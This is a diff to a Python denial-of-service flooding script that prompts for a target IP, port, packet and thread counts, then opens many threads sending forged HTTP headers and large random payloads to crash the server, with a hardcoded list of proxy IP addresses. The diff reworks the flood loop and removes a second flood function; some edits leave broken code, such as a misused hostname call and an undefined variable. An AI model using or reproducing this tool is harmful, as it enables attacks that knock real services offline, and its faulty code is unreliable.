@@ -1,6 +1,5 @@
 import threading
 import os, sys
-import time
 import socket, requests
 import random
 userip = ["""45.68.71.21:8080
@@ -326,9 +325,8 @@ def kok():
  if unlock == 2:
     print("VĪP DÉTÉÇT")
 kok()
-time.sleep(5)
 ip = str(input("IP ATTACK>="))
-ip = socket.gethostbyname(ip)
+ip = socket.gethostname(ip)
 port = int(input("PORT >= "))
 pack = int(input("[ ? ] how long do you want Packet/s >="))
 th = int(input("[ ? ] how long do you want Thread/t >="))
@@ -353,13 +351,12 @@ def randomip():
 
 def start():
   global userip, acceptall, all, useragents, socks5
-  hh = random._urandom(999999)
+  data = random._urandom(999999)
   xx = int(0)
   nolakall = "IpAll: "+random.choice(all)+random.choice(userip)+"\r\n"
   sockall = random.choice(socks5)+random.choice(all)+random.choice(useragents)+random.choice(userip)+random.choice(acceptall)+"\r\n"
   lolall = random.choice(useragents)+random.choice(userip)+"\r\n"
   agentall = "UserAgents: "+random.choice(useragents)+random.choice(userip)+random.choice(all)+random.choice(socks5)+random.choice(acceptall)+"\r\n"
-  cekall = "Bantai: "+random.choice(all)+random.choice(userip)+random.choice(acceptall)+"\r\n"
   ipser = "IP: "+random.choice(userip)+"\r\n"
   accept = random.choice(acceptall)+"\r\n"
   content    = "Content-Type: application/x-www-form-urlencoded\r\n"
@@ -371,32 +368,18 @@ def start():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((str(ip),int(port)))
             s.send(str.encode(main_req))
+            s.send(str.encode(data))
             for i in range(pack):
                 s.send(str.encode(main_req))
+                s.send(str.encode(data))
             xx += random.randint(0, int(pack))
             print("SÉRVÉR {1} CRÂSH BY ZÁN")
         except:
             s.close()
             print('[+] server error')
-def stack():
- data = random._urandom(5000)
- i = random.choice(("[*]","[!]","[#]"))
- while True:
-       try:
-         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-         s.connect((ip,port))
-         s.send((data,main_req))
-         for y in range(pack):
-          s.send((data,main_req))
-          print("SÉRVÉR {1} CRÂSH BY ZÁN")
-       except:
-          print("[+] server error")
          
-           
 for x in range(th):
+ if choice == 'y':
   thred = threading.Thread(target=start)
-  thred.start()
-else: 
-  thred = threading.Thread(target=stack)
   thred.start()
   
